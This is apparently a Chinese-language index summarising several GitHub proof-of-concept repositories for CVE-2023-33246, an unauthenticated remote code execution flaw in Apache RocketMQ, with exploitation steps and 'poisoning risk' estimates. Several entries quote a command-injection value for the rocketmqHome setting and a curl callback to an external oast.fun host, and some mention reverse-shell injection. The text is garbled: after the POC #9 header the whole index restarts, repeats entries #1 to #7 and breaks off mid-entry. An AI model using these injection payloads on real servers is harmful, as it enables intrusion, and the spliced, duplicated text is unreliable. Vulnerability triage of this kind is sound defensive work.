1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

